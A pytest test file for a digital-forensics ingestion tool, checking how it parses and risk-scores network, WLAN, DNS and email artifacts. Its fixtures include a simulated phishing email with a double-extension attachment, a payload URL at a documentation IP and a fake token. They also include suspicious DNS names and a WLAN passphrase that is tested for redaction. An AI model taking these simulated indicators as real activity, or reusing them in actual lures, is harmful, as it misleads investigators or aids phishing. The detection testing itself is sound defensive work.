    assert "direct_ip_connection" in netstat_docs[0]["tags"]
    assert arp_docs[0]["event"]["type"] == "arp_entry"
    assert any(item["wlan"]["profile_name"] == "CorpWifi" for item in netsh_docs)


def test_network_registry_and_evtx_classification() -> None:
    base = Path(__file__).parent / "fixtures" / "network"
    reg_profile_docs = normalize_file(
        "case-1",
        "ev-net-reg1",
        "art-net-reg1",
        base / "registry_networklist_sample.csv",
        {
            "artifact_type": "network",
            "parser": "registry",
            "source_tool": "recmd",
            "source_format": "csv",
            "source_path": str(base / "registry_networklist_sample.csv"),
            "name": "registry_networklist_sample.csv",
        },
    )
    reg_tcpip_docs = normalize_file(
        "case-1",
        "ev-net-reg2",
        "art-net-reg2",
        base / "registry_tcpip_interfaces_sample.csv",
        {
            "artifact_type": "network",
            "parser": "registry",
            "source_tool": "recmd",
            "source_format": "csv",
            "source_path": str(base / "registry_tcpip_interfaces_sample.csv"),
            "name": "registry_tcpip_interfaces_sample.csv",
        },
    )
    evtx_docs = normalize_file(
        "case-1",
        "ev-net-evtx",
        "art-net-evtx",
        base / "wlan_autoconfig_evtx_output.csv",
        {
            "artifact_type": "wlan",
            "parser": "wlan_evtx",
            "source_tool": "evtxecmd",
            "source_format": "evtx_csv",
            "source_path": str(base / "wlan_autoconfig_evtx_output.csv"),
            "name": "wlan_autoconfig_evtx_output.csv",
        },
    )
    assert reg_profile_docs[0]["event"]["type"] == "network_profile"
    assert reg_tcpip_docs[0]["event"]["type"] in {"interface_config", "dns_config"}
    assert evtx_docs[0]["artifact"]["type"] == "wlan"
    assert evtx_docs[0]["event"]["type"] == "wlan_connected"


def test_network_correlations_and_sections(monkeypatch) -> None:
    base = Path(__file__).parent / "fixtures" / "network"
    dns_docs = normalize_file(
        "case-1",
        "ev-net-dns",
        "art-net-dns",
        base / "dns_cache_sample.csv",
        {
            "artifact_type": "network",
            "parser": "dns_csv",
            "source_tool": "dns",
            "source_format": "csv",
            "source_path": str(base / "dns_cache_sample.csv"),
            "name": "dns_cache_sample.csv",
        },
    )
    hosts_docs = normalize_file(
        "case-1",
        "ev-net-hosts",
        "art-net-hosts",
        base / "hosts_sample",
        {
            "artifact_type": "network",
            "parser": "hosts_file",
            "source_tool": "hosts",
            "source_format": "txt",
            "source_path": str(base / "hosts_sample"),
            "name": "hosts",
        },
    )
    browser_event = {
        "id": "browser-net-1",
        "@timestamp": "2026-05-11T10:05:00+00:00",
        "event": {"type": "browser_history", "severity": "info", "message": "Visited drive.google.com"},
        "artifact": {"type": "browser"},
        "browser": {"url": "https://drive.google.com", "domain": "drive.google.com", "title": "Drive"},
        "url": {"full": "https://drive.google.com", "domain": "drive.google.com"},
        "tags": [],
        "suspicious_reasons": [],
    }
    bits_event = {
        "id": "bits-net-1",
        "@timestamp": "2026-05-11T10:06:00+00:00",
        "event": {"type": "background_download", "severity": "info", "message": "BITS download"},
        "artifact": {"type": "bits"},
        "bits": {"remote_url": "https://drive.google.com/file", "display_name": "job1"},
        "tags": [],
        "suspicious_reasons": [],
    }
    powershell_event = {
        "id": "ps-net-1",
        "@timestamp": "2026-05-11T10:07:00+00:00",
        "event": {"type": "powershell_console_history", "severity": "info", "message": "Invoke-WebRequest https://drive.google.com"},
        "artifact": {"type": "powershell"},
        "process": {"name": "powershell.exe", "command_line": "Invoke-WebRequest https://drive.google.com"},
        "powershell": {"command": "Invoke-WebRequest https://drive.google.com", "domains": ["drive.google.com"], "urls": ["https://drive.google.com"]},
        "tags": ["powershell"],
        "suspicious_reasons": [],
    }
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter([*dns_docs, *hosts_docs, browser_event, bits_event, powershell_event]))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["wlan_profiles"] == [] or isinstance(result["sections"]["wlan_profiles"], list)
    assert result["sections"]["hosts_entries"]
    assert result["sections"]["network_correlations"]


def test_network_frontend_routes_and_sections_exist() -> None:
    frontend_root = Path(__file__).resolve().parents[2] / "frontend" / "src"
    if not frontend_root.exists():
        frontend_root = Path(__file__).resolve().parents[1].parent / "frontend" / "src"
    if not frontend_root.exists():
        import pytest

        pytest.skip("frontend sources not present in backend-only test image")
    artifact_explorer = (frontend_root / "pages" / "ArtifactExplorer.tsx").read_text(encoding="utf-8")
    event_table = (frontend_root / "components" / "EventTable.tsx").read_text(encoding="utf-8")
    semi_auto = (frontend_root / "pages" / "SemiAutoAnalysis.tsx").read_text(encoding="utf-8")
    evidence_detail = (frontend_root / "pages" / "EvidenceDetail.tsx").read_text(encoding="utf-8")
    assert 'artifactType === "network"' in artifact_explorer
    assert 'if (artifactType === "network") return "network";' in event_table
    assert "wlan_profiles" in semi_auto
    assert "hosts_entries" in semi_auto
    assert "network_correlations" in semi_auto
    assert "No directly parseable network artifacts found. WLAN/Network EVTX artifacts are handled by the EVTX parser." in evidence_detail
    assert "SRUM databases were detected. Use the scoped SRUM action to parse SRUDB.dat with SrumECmd without re-indexing EVTX or MFT." in evidence_detail


def test_wlan_autoconfig_evtx_candidate_is_handled_by_evtx_parser() -> None:
    path = Path(__file__).parent / "fixtures" / "network" / "velociraptor_collection_network"
    discovery = discover_velociraptor_evidences(path)
    evtx = next(item for item in discovery.candidates if item.artifact_type == "wlan_autoconfig_evtx")
    assert evtx.parser_status == "handled_by_evtx_parser"
    assert evtx.parser == "evtx"
    assert evtx.supported is False
    assert evtx.reason == "WLAN AutoConfig EVTX found; handled by EVTX parser."


def test_wlan_open_wep_and_evtx_event_types() -> None:
    open_doc = normalize_row(
        "case-1",
        "ev-wlan-open",
        "art-wlan-open",
        {
            "ArtifactType": "wlan_profile_xml",
            "SSID": "Free Airport WiFi",
            "ProfileName": "Free Airport WiFi",
            "Authentication": "open",
            "Encryption": "none",
            "SourceFile": r"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{11111111-1111-1111-1111-111111111111}\Free Airport WiFi.xml",
        },
        {"artifact_type": "wlan", "parser": "wlan_profile_xml", "source_path": r"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{11111111-1111-1111-1111-111111111111}\Free Airport WiFi.xml", "name": "Free Airport WiFi.xml"},
    )
    wep_doc = normalize_row(
        "case-1",
        "ev-wlan-wep",
        "art-wlan-wep",
        {
            "ArtifactType": "wlan_profile_xml",
            "SSID": "LegacyNet",
            "ProfileName": "LegacyNet",
            "Authentication": "shared",
            "Encryption": "WEP",
        },
        {"artifact_type": "wlan", "parser": "wlan_profile_xml", "source_path": "LegacyNet.xml", "name": "LegacyNet.xml"},
    )
    failed_doc = normalize_row(
        "case-1",
        "ev-wlan-fail",
        "art-wlan-fail",
        {
            "ArtifactType": "wlan_evtx",
            "NetworkEventType": "wlan_connection_failed",
            "EventID": "8002",
            "Provider": "Microsoft-Windows-WLAN-AutoConfig",
            "Channel": "Microsoft-Windows-WLAN-AutoConfig/Operational",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "SSID": "CorpWiFi",
            "Reason": "authentication failed",
            "Computer": "desktop-wlan",
        },
        {"artifact_type": "wlan", "parser": "wlan_evtx", "source_path": "wlan_evtx_failed.jsonl", "name": "wlan_evtx_failed.jsonl"},
    )
    assert open_doc["artifact"]["type"] == "wlan"
    assert "WLAN open network profile" in (open_doc.get("suspicious_reasons") or [])
    assert open_doc["risk_score"] >= 30
    assert "WLAN weak encryption" in (wep_doc.get("suspicious_reasons") or [])
    assert wep_doc["risk_score"] >= 40
    assert failed_doc["event"]["type"] == "wlan_connection_failed"
    assert failed_doc["host"]["name"] == "desktop-wlan"
    assert "WLAN connection failed" in (failed_doc.get("suspicious_reasons") or [])


def test_wlan_keymaterial_redacted_and_not_in_search_text(tmp_path: Path) -> None:
    profile = tmp_path / "wlan_profile_keymaterial.xml"
    profile.write_text(
        """<?xml version="1.0"?>
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
          <name>CorpWiFi</name>
          <SSIDConfig><SSID><name>CorpWiFi</name></SSID></SSIDConfig>
          <MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>SuperSecretPassword123</keyMaterial></sharedKey></security></MSM>
        </WLANProfile>""",
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-wlan-xml",
        "art-wlan-xml",
        profile,
        {"artifact_type": "wlan", "parser": "wlan_profile_xml", "source_path": str(profile), "name": profile.name},
    )
    doc = docs[0]
    assert doc["wlan"]["key_material_present"] is True
    assert "wlan_key_material_redacted" in (doc.get("data_quality") or [])
    assert "WLAN key material present and redacted" in (doc.get("suspicious_reasons") or [])
    assert "SuperSecretPassword123" not in (doc.get("search_text") or "")
    assert "SuperSecretPassword123" not in json.dumps(doc)


def test_wlan_report_and_sample_from_events() -> None:
    events = [
        {
            "artifact": {"type": "wlan", "parser": "wlan_profile_xml"},
            "event": {"type": "wlan_profile"},
            "wlan": {"ssid": "CorpWiFi", "authentication": "WPA2PSK", "encryption": "AES", "interface_guid": "{1}", "source_file": "CorpWiFi.xml"},
            "data_quality": ["wlan_key_material_redacted"],
            "suspicious_reasons": ["WLAN key material present and redacted"],
            "risk_score": 45,
        },
        {
            "artifact": {"type": "wlan", "parser": "wlan_evtx"},
            "event": {"type": "wlan_connected"},
            "wlan": {"ssid": "CorpWiFi", "authentication": "WPA2PSK", "encryption": "AES", "bssid": "aa:bb:cc:dd:ee:ff", "interface_guid": "{1}"},
            "data_quality": [],
            "suspicious_reasons": [],
            "risk_score": 5,
        },
        {
            "artifact": {"type": "wlan", "parser": "wlan_evtx"},
            "event": {"type": "wlan_connection_failed"},
            "wlan": {"ssid": "Free Airport WiFi", "authentication": "open", "encryption": "none", "interface_guid": "{2}"},
            "data_quality": ["missing_host"],
            "suspicious_reasons": ["WLAN open network profile", "WLAN connection failed"],
            "risk_score": 40,
        },
    ]
    parser_audit = [
        {"artifact_type": "wlan", "parser": "wlan_profile_xml", "records_read": 1, "records_parsed": 1, "events_indexed": 1, "source_file": "CorpWiFi.xml"},
        {"artifact_type": "wlan", "parser": "wlan_evtx", "records_read": 2, "records_parsed": 2, "events_indexed": 2, "source_file": "wlan_evtx.csv"},
    ]
    report = _build_wlan_parse_report(parser_audit, [], events, selected_artifact_types=["wlan"], scope="evidence")
    sample = _build_wlan_sample_events(events)
    assert report["records_indexed"] == 3
    assert report["connected_count"] == 1
    assert report["connection_failed_count"] == 1
    assert report["profile_count"] == 1
    assert report["open_network_count"] >= 1
    assert report["key_material_redacted_count"] >= 1
    assert len(sample) == 3


def test_dns_cache_and_evtx_normalization_and_report() -> None:
    benign_doc = normalize_row(
        "case-1",
        "ev-dns-1",
        "art-dns-1",
        {
            "ArtifactType": "dns_cache",
            "Name": "www.microsoft.com.",
            "RecordType": "A",
            "Data": "20.112.250.133",
            "TTL": "120",
            "Timestamp": "2026-05-15T10:00:00Z",
            "Source": "displaydns",
        },
        {"artifact_type": "dns", "parser": "dns_jsonl", "source_path": "dns_cache_benign.jsonl", "name": "dns_cache_benign.jsonl"},
    )
    suspicious_doc = normalize_row(
        "case-1",
        "ev-dns-2",
        "art-dns-2",
        {
            "ArtifactType": "dns_evtx",
            "EventID": "3008",
            "Channel": "Microsoft-Windows-DNS-Client/Operational",
            "Provider": "Microsoft-Windows-DNS-Client",
            "TimeCreated": "2026-05-15T11:00:00Z",
            "QueryName": "raw.githubusercontent.com",
            "RecordType": "A",
            "Status": "success",
            "ProcessName": "powershell.exe",
            "ProcessId": "1234",
            "Computer": "desktop-dns",
        },
        {"artifact_type": "dns", "parser": "dns_evtx", "source_path": "dns_evtx_powershell.jsonl", "name": "dns_evtx_powershell.jsonl"},
    )
    report = _build_dns_parse_report(
        [{"artifact_type": "dns", "parser": "dns_jsonl", "records_read": 1, "records_parsed": 1, "events_indexed": 1, "source_file": "dns_cache_benign.jsonl"}],
        [],
        [benign_doc, suspicious_doc],
        selected_artifact_types=["dns"],
        scope="evidence",
    )
    sample = _build_dns_sample_events([benign_doc, suspicious_doc])
    assert benign_doc["artifact"]["type"] == "dns"
    assert benign_doc["event"]["type"] == "dns_query"
    assert benign_doc["dns"]["domain"] == "www.microsoft.com"
    assert benign_doc["dns"]["record_type"] == "A"
    assert benign_doc["dns"]["ip"] == "20.112.250.133"
    assert benign_doc["url"]["domain"] == "www.microsoft.com"
    assert benign_doc["network"]["destination_ip"] == "20.112.250.133"
    assert benign_doc["timestamp_precision"] == "dns_timestamp"
    assert benign_doc["risk_score"] <= 10
    assert suspicious_doc["artifact"]["parser"] == "dns_evtx"
    assert suspicious_doc["event"]["type"] == "dns_query"
    assert suspicious_doc["process"]["name"] == "powershell.exe"
    assert suspicious_doc["host"]["name"] == "desktop-dns"
    assert "DNS query by scripting process" in (suspicious_doc.get("suspicious_reasons") or [])
    assert suspicious_doc["risk_score"] >= 50
    assert report["records_indexed"] == 2
    assert report["by_event_type"]["dns_query"] == 2
    assert report["by_record_type"]["A"] == 2
    assert report["by_parser"]["dns_evtx"] == 1
    assert len(sample) == 2


def test_dns_suspicious_domain_cases_and_generic_regression() -> None:
    nxdomain_doc = normalize_row(
        "case-1",
        "ev-dns-3",
        "art-dns-3",
        {
            "ArtifactType": "dns_cache",
            "Name": "payload-update-free-ddns.duckdns.org",
            "Status": "NXDOMAIN",
            "RecordType": "A",
            "Timestamp": "2026-05-15T10:00:00Z",
        },
        {"artifact_type": "dns", "parser": "dns_jsonl", "source_path": "dns_nxdomain_duckdns.jsonl", "name": "dns_nxdomain_duckdns.jsonl"},
    )
    puny_doc = normalize_row(
        "case-1",
        "ev-dns-4",
        "art-dns-4",
        {
            "ArtifactType": "dns_cache",
            "Name": "xn--malicious-test.example",
            "RecordType": "A",
            "Data": "10.0.0.8",
        },
        {"artifact_type": "dns", "parser": "dns_jsonl", "source_path": "dns_punycode.jsonl", "name": "dns_punycode.jsonl"},
    )
    dga_doc = normalize_row(
        "case-1",
        "ev-dns-5",
        "art-dns-5",
        {
            "ArtifactType": "dns_cache",
            "Name": "ajsdh1287asdh7812asdh7812asdh.example.xyz",
            "RecordType": "A",
            "Data": "10.0.0.9",
        },
        {"artifact_type": "dns", "parser": "dns_jsonl", "source_path": "dns_dga_long.jsonl", "name": "dns_dga_long.jsonl"},
    )
    unrelated = classify_artifact(Path("generic_unrelated.csv"), ["Name", "Value", "Note"])
    assert nxdomain_doc["event"]["type"] == "dns_query_failed"
    assert nxdomain_doc["dns"]["status"] == "nxdomain"
    assert "DNS NXDOMAIN for suspicious domain" in (nxdomain_doc.get("suspicious_reasons") or [])
    assert "DNS query to dynamic DNS provider" in (nxdomain_doc.get("suspicious_reasons") or [])
    assert nxdomain_doc["risk_score"] >= 50
    assert "DNS query has punycode domain" in (puny_doc.get("suspicious_reasons") or [])
    assert puny_doc["risk_score"] >= 40
    assert any(reason in (dga_doc.get("suspicious_reasons") or []) for reason in ["DNS query has DGA-like domain", "DNS query has unusually long domain"])
    assert dga_doc["risk_score"] >= 50
    assert unrelated["artifact_type"] != "dns"


def test_dns_cname_and_failure_data_quality() -> None:
    cname_doc = normalize_row(
        "case-1",
        "ev-dns-6",
        "art-dns-6",
        {
            "ArtifactType": "dns_cache",
            "Name": "cdn.example.com",
            "RecordType": "CNAME",
            "Data": "edge.example.net",
        },
        {"artifact_type": "dns", "parser": "dns_jsonl", "source_path": "dns_cname.jsonl", "name": "dns_cname.jsonl"},
    )
    failure_doc = normalize_row(
        "case-1",
        "ev-dns-7",
        "art-dns-7",
        {
            "ArtifactType": "dns_evtx",
            "EventID": "3009",
            "Channel": "Microsoft-Windows-DNS-Client/Operational",
            "Provider": "Microsoft-Windows-DNS-Client",
            "TimeCreated": "2026-05-15T11:00:00Z",
            "QueryName": "bad.example",
            "RecordType": "A",
            "Status": "timeout",
        },
        {"artifact_type": "dns", "parser": "dns_evtx", "source_path": "dns_evtx_failure.jsonl", "name": "dns_evtx_failure.jsonl"},
    )
    assert cname_doc["dns"]["record_type"] == "CNAME"
    assert cname_doc["dns"]["data"] == "edge.example.net"
    assert cname_doc["dns"]["ip"] is None
    assert failure_doc["event"]["type"] == "dns_query_failed"
    assert "dns_failed_query" in (failure_doc.get("data_quality") or [])


def test_dns_search_text_and_host_contamination_guard() -> None:
    doc = normalize_row(
        "case-1",
        "ev-dns-8",
        "art-dns-8",
        {
            "ArtifactType": "dns_cache",
            "Name": "x" * 5000 + ".example.com",
            "RecordType": "TXT",
            "Data": "10.0.0.10",
            "SourceFile": r"C:\Temp\dns_cache.csv",
        },
        {"artifact_type": "dns", "parser": "dns_jsonl", "source_path": r"C:\Temp\dns_cache.csv", "name": "dns_cache.csv"},
    )
    assert doc["host"]["name"] is None
    assert "dns_cache.csv" not in str(doc["host"].get("name") or "")
    assert len(doc["search_text"]) <= SEARCH_TEXT_MAX_CHARS


def test_execution_artifacts_frontend_prioritizes_amcache_name_path_and_summary() -> None:
    event_table = (Path(__file__).resolve().parents[2] / "frontend" / "src" / "components" / "EventTable.tsx").read_text(encoding="utf-8")
    assert 'function executionArtifactTypeLabel' in event_table
    assert 'function executionArtifactProgramFile' in event_table
    assert 'label: "Program / File"' in event_table
    assert 'label: "Publisher / Version"' in event_table
    assert 'summary,' in event_table


def _write_test_eml(path: Path, *, subject: str, auth: str, attachment_name: str | None = None, body: str = "Hello") -> None:
    message = EmailMessage()
    message["From"] = "attacker@suspicious.example"
    message["To"] = "user01@example.local"
    message["Subject"] = subject
    message["Date"] = "Tue, 19 May 2026 10:15:00 +0000"
    message["Message-ID"] = "<message-1@suspicious.example>"
    message["Reply-To"] = "billing@reply.example"
    message["Authentication-Results"] = auth
    message["X-Originating-IP"] = "[203.0.113.10]"
    message.set_content(body)
    if attachment_name:
        message.add_attachment(b"test-payload", maintype="application", subtype="octet-stream", filename=attachment_name)
    path.write_bytes(message.as_bytes())


def test_email_eml_parser_extracts_headers_risk_and_preview(tmp_path: Path) -> None:
    path = tmp_path / "phishing.eml"
    _write_test_eml(
        path,
        subject="Invoice",
        auth="mx.example; spf=fail smtp.mailfrom=suspicious.example; dkim=fail header.d=suspicious.example; dmarc=fail action=reject",
        attachment_name="invoice.pdf.exe",
        body="Please review http://203.0.113.10/payload access_token=secretvalue",
    )

    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {"artifact_type": "email", "name": path.name, "source_path": str(path), "parser": "email_eml"},
    )

    assert len(docs) == 1
    doc = docs[0]
    assert doc["event"]["type"] == "email_message"
    assert doc["artifact"]["type"] == "email"
    assert doc["email"]["subject"] == "Invoice"
    assert doc["email"]["from"]["address"] == "attacker@suspicious.example"
    assert doc["email"]["headers"]["spf_result"] == "fail"
    assert doc["email"]["headers"]["dmarc_result"] == "fail"
    assert doc["risk_score"] >= 70
    assert "Suspicious email attachment observed" in (doc.get("suspicious_reasons") or [])
    assert "http://203.0.113.10/payload" in doc["search_text"]
    assert "secretvalue" not in str(doc["email"]["body_preview"])
    assert "[REDACTED]" in str(doc["email"]["body_preview"])
    assert doc["@timestamp"] == "2026-05-19T10:15:00+00:00"


def test_email_mbox_parser_splits_messages(tmp_path: Path) -> None:
    path = tmp_path / "Inbox"
    mbox = mailbox.mbox(str(path), create=True)
    try:
        for idx, subject in enumerate(["Hello", "Second"], start=1):
            message = EmailMessage()
            message["From"] = "user01@example.local"
            message["To"] = "analyst01@example.local"
            message["Subject"] = subject
            message["Date"] = f"Tue, 19 May 2026 1{idx}:00:00 +0000"
            message["Message-ID"] = f"<msg-{idx}@example.local>"
            message.set_content(f"Body {idx}")
            mbox.add(message)
        mbox.flush()
    finally:
        mbox.close()

    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {"artifact_type": "email", "name": path.name, "source_path": str(path), "parser": "email_mbox"},
    )

    assert len(docs) == 2
    assert {doc["email"]["subject"] for doc in docs} == {"Hello", "Second"}
    assert all(doc["event"]["type"] == "email_message" for doc in docs)


def test_email_inventory_and_temp_attachments_are_non_fatal(tmp_path: Path) -> None:
    pst = tmp_path / "mailbox.pst"
    pst.write_bytes(b"PSTPLACEHOLDER")
    ost = tmp_path / "mailbox.ost"
    ost.write_bytes(b"OSTPLACEHOLDER")
    temp_attachment = tmp_path / "Users" / "user01" / "AppData" / "Local" / "Microsoft" / "Windows" / "INetCache" / "Content.Outlook" / "ABC123"
    temp_attachment.mkdir(parents=True)
    temp_file = temp_attachment / "invoice.docm"
    temp_file.write_bytes(b"DOCM")
    store = tmp_path / "Users" / "user01" / "AppData" / "Local" / "Comms" / "UnistoreDB"
    store.mkdir(parents=True)
    store_vol = store / "store.vol"
    store_vol.write_bytes(b"ESEPLACEHOLDER")

    pst_docs = normalize_file("case-1", "ev-1", "art-pst", pst, {"artifact_type": "email", "name": pst.name, "source_path": r"C:\Users\user01\AppData\Local\Microsoft\Outlook\mailbox.pst", "parser": "email_pst_inventory"})
    ost_docs = normalize_file("case-1", "ev-1", "art-ost", ost, {"artifact_type": "email", "name": ost.name, "source_path": r"C:\Users\user01\AppData\Local\Microsoft\Outlook\mailbox.ost", "parser": "email_ost_inventory"})
    temp_docs = normalize_file("case-1", "ev-1", "art-temp", temp_file, {"artifact_type": "email", "name": temp_file.name, "source_path": r"C:\Users\user01\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\ABC123\invoice.docm", "parser": "email_outlook_temp_attachment"})
    store_docs = normalize_file("case-1", "ev-1", "art-store", store_vol, {"artifact_type": "email", "name": store_vol.name, "source_path": r"C:\Users\user01\AppData\Local\Comms\UnistoreDB\store.vol", "parser": "email_windows_mail_inventory"})

    assert pst_docs[0]["event"]["type"] == "email_mailbox_observed"
    assert pst_docs[0]["email"]["unsupported_reason"] == "unsupported_pst_ost_parsing_not_enabled"
    assert ost_docs[0]["event"]["type"] == "email_mailbox_observed"
    assert temp_docs[0]["event"]["type"] == "email_temp_attachment_observed"
    assert temp_docs[0]["risk_score"] >= 70
    assert "Macro-enabled Office attachment" in (temp_docs[0].get("suspicious_reasons") or [])
    assert store_docs[0]["event"]["type"] == "email_client_artifact_observed"


def test_email_artifact_detection_and_debug_reports(tmp_path: Path) -> None:
    eml = tmp_path / "phishing.eml"
    _write_test_eml(
        eml,
        subject="Invoice",
        auth="mx.example; spf=fail smtp.mailfrom=suspicious.example; dkim=fail header.d=suspicious.example; dmarc=fail action=reject",
        attachment_name="invoice.docm",
        body="Visit http://203.0.113.10/payload",
    )
    inbox_root = tmp_path / "Users" / "user01" / "AppData" / "Roaming" / "Thunderbird" / "Profiles" / "abc.default-release"
    inbox_root.mkdir(parents=True)
    inbox = inbox_root / "Inbox"
    mbox = mailbox.mbox(str(inbox), create=True)
    try:
        message = EmailMessage()
        message["From"] = "user01@example.local"
        message["To"] = "analyst01@example.local"
        message["Subject"] = "Benign"
        message["Date"] = "Tue, 19 May 2026 12:00:00 +0000"
        message["Message-ID"] = "<benign@example.local>"
        message.set_content("Hello")
        mbox.add(message)
        mbox.flush()
    finally:
        mbox.close()

    assert classify_artifact(eml)["artifact_type"] == "email"
    assert classify_artifact(inbox)["artifact_type"] == "email"
    assert classify_artifact(Path(r"C:\Users\user01\AppData\Local\Microsoft\Outlook\mailbox.pst"))["artifact_type"] == "email"
    assert classify_artifact(Path(r"C:\Users\user01\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\ABC123\invoice.docm"))["artifact_type"] == "email"
    assert classify_artifact(Path("generic_unrelated.txt"))["artifact_type"] != "email"

    events = normalize_file("case-1", "ev-1", "art-eml", eml, {"artifact_type": "email", "name": eml.name, "source_path": str(eml), "parser": "email_eml"})
    events += normalize_file("case-1", "ev-1", "art-mbox", inbox, {"artifact_type": "email", "name": inbox.name, "source_path": r"C:\Users\user01\AppData\Roaming\Thunderbird\Profiles\abc.default-release\Inbox", "parser": "email_mbox"})
    sample = _build_email_sample_events(events)
    report = _build_email_parse_report(
        [
            {
                "artifact_type": "email",
                "parser": "email_eml",
                "records_read": 1,
                "records_parsed": 1,
                "records_indexed": 1,
                "by_event_type": {"email_message": 1},
                "by_sender_domain": {"suspicious.example": 1},
                "by_attachment_extension": {".docm": 1},
                "warnings": [],
                "parser_errors": [],
            }
        ],
        [{"category": "email", "artifact_type": "email_message"}],
        events,
        selected_artifact_types=["email"],
        scope="evidence",
    )

    assert sample
    assert report["message_count"] >= 2
    assert report["auth_failure_count"] >= 1
    assert report["by_sender_domain"]["suspicious.example"] >= 1
    assert report["by_attachment_extension"][".docm"] >= 1
    assert "Invoice" in events[0]["search_text"]


def test_ingest_benchmark_history_is_created_and_sorted() -> None:
    metadata = create_ingest_benchmark(
        {},
        benchmark_id="bench-1",
        evidence_id="evidence-1",
        case_id="case-1",
        run_id="run-1",
        mode="reprocess_previous_selection",
        profile="safe",
        label="baseline-safe",
    )
    metadata = create_ingest_benchmark(
        metadata,
        benchmark_id="bench-2",
        evidence_id="evidence-1",
        case_id="case-1",
        run_id="run-2",
        mode="reprocess_previous_selection",
        profile="performance",
        label="candidate-performance",
    )

    items = list_ingest_benchmarks(metadata)

    assert len(items) == 2
    assert {item["benchmark_id"] for item in items} == {"bench-1", "bench-2"}


def test_build_parser_breakdown_includes_top_slow_artifact() -> None:
    manifest = {
        "artifacts": [
            {
                "name": "EVTX raw - A.evtx",
                "parser": "evtx_raw",
                "status": "completed",
                "record_count": 100,
                "ingest_audit": {"duration_seconds": 10, "records_read": 100, "records_indexed": 100},
            },
            {
                "name": "EVTX raw - slow.evtx",
                "parser": "evtx_raw",
                "status": "failed_timeout",
                "record_count": 50,
                "ingest_audit": {"duration_seconds": 45, "records_read": 80, "records_indexed": 50, "top_errors": ["timed out"]},
            },
        ]
    }
    problematic_report = {
        "items": [
            {
                "name": "EVTX raw - slow.evtx",
                "effective_status": "partially_parsed",
                "error_message": "timed out",
                "retryable": True,
                "suggested_primary_action": "check_health",
            }
        ]
    }

    breakdown = build_parser_breakdown(manifest, problematic_report)

    assert breakdown["evtx_raw"]["artifacts"] == 2
    assert breakdown["evtx_raw"]["top_slow_artifacts"][0]["artifact_name"] == "EVTX raw - slow.evtx"
    assert breakdown["evtx_raw"]["top_slow_artifacts"][0]["retryable"] is True


def test_benchmark_artifact_count_summary_stays_scoped_to_current_manifest() -> None:
    manifest = {
        "artifacts": [
            {"name": "A.evtx", "parser": "evtx_raw", "status": "completed"},
            {"name": "B.evtx", "parser": "evtx_raw", "status": "failed_timeout"},
            {"name": "C.evtx", "parser": "evtx_raw", "status": "queued_parallel"},
        ]
    }

    summary = summarize_benchmark_artifact_counts(manifest, selected_total=3)
    breakdown = build_parser_breakdown(manifest, None)

    assert summary["selected_total"] == 3
    assert summary["artifacts_created_for_run"] == 3
    assert summary["artifacts_processed_for_run"] == 2
    assert summary["artifacts_failed_for_run"] == 1
    assert sum(item["artifacts"] for item in breakdown.values()) == summary["artifacts_created_for_run"]


def test_schedule_parallel_artifact_seeds_db_row_as_queued_parallel(monkeypatch: pytest.MonkeyPatch) -> None:
    created: dict[str, str] = {}
    submitted: dict[str, object] = {}

    class DummyExecutor:
        def submit(self, fn, **kwargs):  # noqa: ANN001
            submitted["fn"] = fn
            submitted["kwargs"] = kwargs
            return object()

    def fake_create_artifact_row_isolated(**kwargs):  # noqa: ANN003
        created["status"] = kwargs["status"]
        return "artifact-1"

    monkeypatch.setattr("app.workers.tasks._create_artifact_row_isolated", fake_create_artifact_row_isolated)

    evidence = SimpleNamespace(id="evidence-1", case_id="case-1", detected_host=None, detected_user=None)
    artifact_info = {
        "name": "Security.evtx",
        "artifact_type": "windows_event",
        "source_path": "Windows/System32/winevt/Logs/Security.evtx",
        "parser": "evtx_raw",
    }
    manifest = {"artifacts": []}
    parallel_futures: dict[object, dict] = {}

    _schedule_parallel_artifact(
        executor=DummyExecutor(),
        evidence=evidence,
        artifact_info=artifact_info,
        ingest_batch_size=500,
        index_name="dfir-events-case-1",
        max_bulk_docs=1000,
        max_bulk_bytes=1_000_000,
        tracker={},
        tracker_lock=threading.Lock(),
        manifest=manifest,
        parallel_futures=parallel_futures,
        detections_enabled=False,
    )

    assert created["status"] == "queued_parallel"
    assert manifest["artifacts"][0]["status"] == "queued_parallel"
    assert len(parallel_futures) == 1
    assert submitted["kwargs"]["artifact_id"] == "artifact-1"


def test_schedule_parallel_artifact_ignores_inherited_processing_status(monkeypatch: pytest.MonkeyPatch) -> None:
    created: dict[str, str] = {}

    class DummyExecutor:
        def submit(self, fn, **kwargs):  # noqa: ANN001,ARG002
            return object()

    def fake_create_artifact_row_isolated(**kwargs):  # noqa: ANN003
        created["status"] = kwargs["status"]
        return "artifact-1"

    monkeypatch.setattr("app.workers.tasks._create_artifact_row_isolated", fake_create_artifact_row_isolated)

    evidence = SimpleNamespace(id="evidence-1", case_id="case-1", detected_host=None, detected_user=None)
    artifact_info = {
        "name": "Security.evtx",
        "artifact_type": "windows_event",
        "source_path": "Windows/System32/winevt/Logs/Security.evtx",
        "parser": "evtx_raw",
        "status": "processing",
    }

    _schedule_parallel_artifact(
        executor=DummyExecutor(),
        evidence=evidence,
        artifact_info=artifact_info,
        ingest_batch_size=500,
        index_name="dfir-events-case-1",
        max_bulk_docs=1000,
        max_bulk_bytes=1_000_000,
        tracker={},
        tracker_lock=threading.Lock(),
        manifest={"artifacts": []},
        parallel_futures={},
        detections_enabled=False,
    )

    assert created["status"] == "queued_parallel"


def test_initial_runtime_artifact_status_does_not_reuse_previous_terminal_state() -> None:
    assert _initial_runtime_artifact_status(
        artifact_info={"parser": "scheduled_task_xml", "artifact_type": "scheduled_task", "status": "completed"},
        parallel_safe=False,
    ) == "processing"
    assert _initial_runtime_artifact_status(
        artifact_info={"parser": "evtx_raw", "artifact_type": "windows_event", "status": "completed"},
        parallel_safe=True,
    ) == "queued_parallel"


